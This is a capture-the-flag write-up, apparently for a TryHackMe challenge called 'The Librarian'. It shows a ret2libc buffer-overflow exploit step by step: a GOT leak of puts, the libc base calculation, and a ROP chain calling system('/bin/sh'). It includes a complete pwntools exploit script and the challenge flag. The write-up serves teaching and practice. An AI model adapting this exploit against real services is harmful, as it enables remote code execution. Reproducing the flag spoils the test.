# The Librarian

## Source Code Analysis

This challenge is much similar to the last one (Random memories)

```cpp
void vuln(){
    char *buf[0x20];
    puts("Again? Where this time? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
    }

int main(){
    setup();
    vuln();

}
```

However, this time, we do not know the address of the `vuln()`, and this time we do not have a `win()` function

## ELF Analysis

We can then conduct some analysis first.

```bash
└─$ file thelibrarian 
thelibrarian: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=df3e0c1eafdcadd30b47663d94d2d6a88568803e, not stripped

└─$ checksec --file=thelibrarian 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68 Symbols        No    0               1               thelibrarian

```

The binary itself has PIE disabled, which makes the exploit become much easier.

We can see the interpreter `ld-linux-x86-64.so.2` and the `libc.so.6` library also included.

```bash
─$ ls 
ld-linux-x86-64.so.2  libc.so.6  thelibrarian
```

If we look at the Libc library itself, we can see PIE is enabled.

```python
└─$ checksec --file=libc.so.6 
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

```

So despite the ELF has fixed address, every time the base Libc address will differ, makes it harder to call certain functions (e.g. `system`, `/bin/sh`) for the exploit.

## Leak the offset

As aforementioned, we know that we can enter a large input to overflow the buffer and even the return address.

We can find it by using this simple pwntool script.

```python
from pwn import *

def start(argv=[], *a, **kwargs):
     if args.GDB:
         return gdb.debug([exe]+argv, gdbscript=gdbscript, *a, **kwargs)
     if args.REMOTE:
         return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
     else:
         return process([exe]+argv, *a, **kwargs)

gdbscript='''
continue
'''

exe='./thelibrarian'
elf=context.binary=ELF(exe)
context.log_level="debug"

libc=ELF('./libc.so.6')

banner=b'Again? Where this time? :'

cyclic_payload=cyclic(500)

io=start()
io.sendlineafter(banner, cyclic_payload)

io.wait()

core=io.corefile

rbp=core.rbp

rsp_offset=cyclic_find(rbp)+8

log.info(f"{rsp_offset=}")
```

Execute it to find the offset

```python
└─$ python test.py
                                                                                                                                                                                                                      
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
    
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Starting local process './thelibrarian': pid 1464521
[DEBUG] Received 0x1b bytes:
    b'Again? Where this time? : \n'
[DEBUG] Sent 0x1f5 bytes:
    b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae\n'
[*] Process './thelibrarian' stopped with exit code -11 (SIGSEGV) (pid 1464521)
[DEBUG] core_pattern: b'core'
[DEBUG] core_uses_pid: True
[DEBUG] interpreter: ''
[DEBUG] Found core immediately: 'core.1464521'
[+] Parsing corefile...: Done
...
[+] Parsing corefile...: Done
...
[*] rsp_offset=264
```

So we now know the offset is 264

## Leak the Libc base Address

To find the Libc base address, we first need a valid address in the Global Offset Table (GOT). To be more precise, I will use the `puts` function to print the `puts` address in GOT

To put it in practice, we will first need to pop RDI, which is the first argument for most functions. Using `ROPgadget`, we found it to be `0x400639`.

```python
└─$ ROPgadget --binary thelibrarian|grep "pop rdi ; ret"
0x0000000000400637 : mov ebp, esp ; pop rdi ; ret
0x0000000000400636 : mov rbp, rsp ; pop rdi ; ret
0x0000000000400639 : pop rdi ; ret
0x0000000000400635 : push rbp ; mov rbp, rsp ; pop rdi ; ret
```

Then we need to know the `.got.plt` address and the PLT address. The `.got.plt` points to the Libc address of `puts`, and we need the PLT address to call `puts` to print that address. We find that the addresses of puts in `.plt` and `.got.plt` are `0x4004e0` and `0x601018`, respectively.

```python
─$ objdump -D thelibrarian|grep puts
00000000004004e0 <puts@plt>:
  4004e0:       ff 25 32 0b 20 00       jmp    *0x200b32(%rip)        # 601018 <puts@GLIBC_2.2.5>
  400650:       e8 8b fe ff ff          call   4004e0 <puts@plt>
  400675:       e8 66 fe ff ff          call   4004e0 <puts@plt>
```

Finally, we need to find the main address so we can continue interacting with the program after exploitation. Using `objdump`, and we get `0x40067d`

```python
└─$ objdump -D thelibrarian|grep main
  400534:       ff 15 b6 0a 20 00       call   *0x200ab6(%rip)        # 600ff0 <__libc_start_main@GLIBC_2.2.5>
000000000040067d <main>:
```

Now, we need to gather everything together to form the payload. It goes like this:

1. We overflow the buffer
2. We pop RDI and fill it with the `.got.plt` address
3. We then call the `plt_puts`, which reads the RDI and print the value
4. Return to the main function

```python
pop_rdi_ret_gadget=0x400639 
got_puts=0x601018
plt_puts=0x4004e0
main=0x40067d

leak_payload=flat({rsp_offset:[pop_rdi_ret_gadget, got_puts, plt_puts, main]})

io=start()
io.sendlineafter(banner, leak_payload)
io.recvline() #skip the next line
io.recvline() #Skip the next line
io.recvline() #Skip ok Let's go
io.recvline() #Skip the next line
libc_puts=u64(io.recvline().strip().ljust(8, b'\x00'))
log.info(f"{hex(libc_puts)=}")
```

We should see at the bottom the address of `libc_puts`

```python
[*] hex(libc_puts)='0x7f168f080970'
```

Find the offset of `puts` using `readelf` 

```python
readelf -s libc.so.6 |grep puts
   423: 0000000000080970   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
```

No we can calculate the Libc base address

```python
libc_puts_offset=0x80970
libc_base=libc_puts-libc_puts_offset
log.info(f"{hex(libc_base)=}")
```

Run the script again, and you should see the base address ends with 0s

```python
[*] hex(libc_puts)='0x7f63c6c80970'
[*] hex(libc_base)='0x7f63c6c00000'
```

## Getting Shell

To get a shell, we need three things:

- The Libc offset of `/bin/sh`
- `ret` gadget for stack alignment
- The Libc offset of `system()`

For `/bin/sh`, I set a breakpoint in main, then after it hits the breakpoint, I search for `/bin/sh`, and use `vmmap` to know the start of Libc, then subtract to find the offset `0x1b3d88`.

![image.png](The%20Librarian/image.png)

Then similarly, use `ROPgadget` to find ret, it is `0x4004c6`

```python
─$ ROPgadget --binary thelibrarian|grep ret
...
0x00000000004004c6 : ret
```

Finally, locate the `system` in Libc.

```python
└─$ readelf -s libc.so.6|grep system
  1406: 000000000004f420    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

The whole payload will be like this. The exploitation flow will be:

1. Overflow the buffer again
2. Pop RDI and put `/bin/sh`
3. Add `ret` gadget for stack alignment
4. Call `system()`

```python
libc_bin_sh_offset=0x1b3d88
libc_bin_sh=libc_base+libc_bin_sh_offset
log.info(f"{libc_bin_sh=}")

ret_gadget=0x4004c6

libc_system_offset=0x4f420
libc_system=libc_base+libc_system_offset
log.info(f"{libc_system=}")

payload=flat({rsp_offset: [pop_rdi_ret_gadget, libc_bin_sh, ret_gadget, libc_system]})

io.sendlineafter(banner, payload)
io.interactive()
```

If we run the exploit locally, we will see we can run Arbitrary commands

![image.png](The%20Librarian/image%201.png)

Run remotely to get flag

```python
# python exploit.py REMOTE 10.49.175.19 9008
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] rsp_offset=264
[+] Opening connection to 10.49.175.19 on port 9008: Done
[DEBUG] Received 0x1b bytes:
    b'Again? Where this time? : \n'
...
[*] hex(libc_puts)='0x7f2e39f6e970'
[*] hex(libc_base)='0x7f2e39eee000'
[*] libc_bin_sh=139836518964616
[*] libc_system=139836517504032
...
[*] Switching to interactive mode
 
[DEBUG] Received 0x10 bytes:
    b'\n'
    b"ok, let's go!\n"
    b'\n'

ok, let's go!

$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2c bytes:
    b'flag.txt\n'
    b'ld-linux-x86-64.so.2\n'
    b'libc.so.6\n'
    b'run\n'
flag.txt
ld-linux-x86-64.so.2
libc.so.6
run
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x23 bytes:
    b'THM{YAY_You_r3t_t0_libc_well_d0n3}\n'
THM{YAY_You_r3t_t0_libc_well_d0n3}
```

## Full Exploit

```python
from pwn import *

def start(argv=[], *a, **kwargs):
     if args.GDB:
         return gdb.debug([exe]+argv, gdbscript=gdbscript, *a, **kwargs)
     if args.REMOTE:
         return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
     else:
         return process([exe]+argv, *a, **kwargs)

gdbscript='''
continue
'''

exe='./thelibrarian'
elf=context.binary=ELF(exe)
context.log_level="debug"

libc=ELF('./libc.so.6')

banner=b'Again? Where this time? :'

'''
cyclic_payload=cyclic(500)

io=start()
io.sendlineafter(banner, cyclic_payload)

io.wait()

core=io.corefile

rbp=core.rbp

rsp_offset=cyclic_find(rbp)+8
'''

rsp_offset=264
log.info(f"{rsp_offset=}")

pop_rdi_ret_gadget=0x400639 
got_puts=0x601018
plt_puts=0x4004e0
main=0x40067d

leak_payload=flat({rsp_offset:[pop_rdi_ret_gadget, got_puts, plt_puts, main]})

io=start()
io.sendlineafter(banner, leak_payload)
io.recvline() #skip the next line
io.recvline() #Skip the next line
io.recvline() #Skip ok Let's go
io.recvline() #Skip the next line
libc_puts=u64(io.recvline().strip().ljust(8, b'\x00'))
log.info(f"{hex(libc_puts)=}")

libc_puts_offset=0x80970
libc_base=libc_puts-libc_puts_offset
log.info(f"{hex(libc_base)=}")

libc_bin_sh_offset=0x1b3d88
libc_bin_sh=libc_base+libc_bin_sh_offset
log.info(f"{libc_bin_sh=}")

ret_gadget=0x4004c6

libc_system_offset=0x4f420
libc_system=libc_base+libc_system_offset
log.info(f"{libc_system=}")

payload=flat({rsp_offset: [pop_rdi_ret_gadget, libc_bin_sh, ret_gadget, libc_system]})

io.sendlineafter(banner, payload)
io.interactive()
```

Flag: `THM{YAY_You_r3t_t0_libc_well_d0n3}`